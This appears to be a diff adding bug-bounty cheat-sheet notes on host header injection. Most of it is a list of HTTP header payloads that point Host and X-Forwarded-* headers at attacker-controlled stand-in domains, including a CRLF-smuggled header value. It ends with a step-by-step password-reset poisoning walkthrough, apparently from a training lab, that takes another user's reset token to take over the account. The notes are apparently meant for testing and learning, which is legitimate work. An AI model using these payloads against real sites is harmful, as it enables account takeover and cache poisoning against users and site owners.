@@ -1,0 +1,76 @@
+▶ Redirect Different Domain
+▶ Web cache Poisioning
+▶ Password Reset Poisioning
+▶ SSRF and XSS
+▶ Open Redirect
+
+Domain to IP:
+https://securitycipher.com/security-tools/
+https://www.kitterman.com/spf/validate.html
+https://viewdns.info/
+
+Method:
+Host: evil-website.com
+...
+
+Host: vulnerable-website.com
+Host: evil-website.com
+...
+
+ Host: vulnerable-website.com
+Host: evil-website.com
+...
+
+X-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+...
+
+Host: vulnerable-website.com
+X-Forwarded-For : evil-website.com
+...
+
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: evil-website.com
+...
+
+Host: www.example.com%0d%0aX-Forwarded-For: 192.168.1.1
+...
+
+Host: www.example.com.attacker.com
+...
+
+Host: victim.com
+X-Forwarded-Host: attacker.com
+...
+
+Host: attacker.com
+X-Forwarded-Host: victim.com
+...
+
+Referer : attacker.com
+
+Resource:
+https://github.com/daffainfo/AllAboutBugBounty/blob/master/Host%20Header%20Injection.md
+
+Tools :
+https://github.com/hemantsolo/Host-Header-Injection-Vulnerability-Scanner
+https://github.com/pikpikcu/hostinject
+https://github.com/mlcsec/headi
+
+windows.location.replacee("https://www.google.com")
+
+Passowd Reset Link:
+▶ Password Reset link genarate
+▶ Host header Injection and replace host from real host to bing.com
+▶ Replaced bing.com to exploit server url and user to caarlos instead of wiener
+▶ got a password reset token of carlos user
+▶ took the orginial first password reset link and replaced the token of carlos that we got from carlos
+▶ Successfully reset the password for user carlos
+
+
+
+
